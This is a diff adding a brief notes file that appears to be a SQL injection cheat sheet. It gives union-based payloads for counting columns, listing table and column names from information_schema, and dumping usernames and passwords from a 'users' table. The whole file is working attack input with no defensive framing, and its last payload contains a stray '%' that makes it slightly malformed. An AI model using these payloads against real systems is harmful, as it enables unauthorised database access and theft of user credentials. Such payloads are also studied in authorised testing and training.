@@ -1,0 +1,22 @@
+
+findings tables and cloumns
+
+order by 3
+
+union select 1,2,3
+
+------------------
+finding table name
+------------------
+union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database--+
+
+------------------
+finding column name
+------------------
+union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
+-------------
+finding creds
+-------------
+
+union select all 1,group_concat(username),3 from users--+
+union select all 1,group_concat(username),group_concat(password) from% users--+
